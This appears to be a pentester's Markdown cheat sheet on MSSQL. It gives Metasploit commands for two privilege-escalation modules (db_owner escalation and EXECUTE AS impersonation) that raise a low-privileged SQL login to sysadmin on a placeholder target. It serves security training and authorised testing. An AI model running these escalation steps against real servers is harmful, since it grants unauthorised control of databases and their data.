# MSSQL

## 01 - Metasploit

- **Low Privileged user to Sysadmin**

```
msf > use auxiliary/admin/mssql/mssql_escalate_dbowner

msf auxiliary(admin/mssql/mssql_escalate_dbowner) > options

Module options (auxiliary/admin/mssql/mssql_escalate_dbowner):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(admin/mssql/mssql_escalate_dbowner) > set rhosts <IP>

msf auxiliary(admin/mssql/mssql_escalate_dbowner) > set username <username>

msf auxiliary(admin/mssql/mssql_escalate_dbowner) > set password <password>

msf auxiliary(admin/mssql/mssql_escalate_dbowner) > run
```

- **Impersonating Sysadmin user**

```
msf > use auxiliary/admin/mssql/mssql_escalate_execute_as

msf auxiliary(admin/mssql/mssql_escalate_execute_as) > options

Module options (auxiliary/admin/mssql/mssql_escalate_execute_as):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(admin/mssql/mssql_escalate_execute_as) > set rhosts <IP>

msf auxiliary(admin/mssql/mssql_escalate_execute_as) > set username <username>

msf auxiliary(admin/mssql/mssql_escalate_execute_as) > set password <password>

msf auxiliary(admin/mssql/mssql_escalate_execute_as) > run
```

## References

- [MSSQL For Pentester Metasploit](https://www.hackingarticles.in/mssql-for-pentester-metasploit/)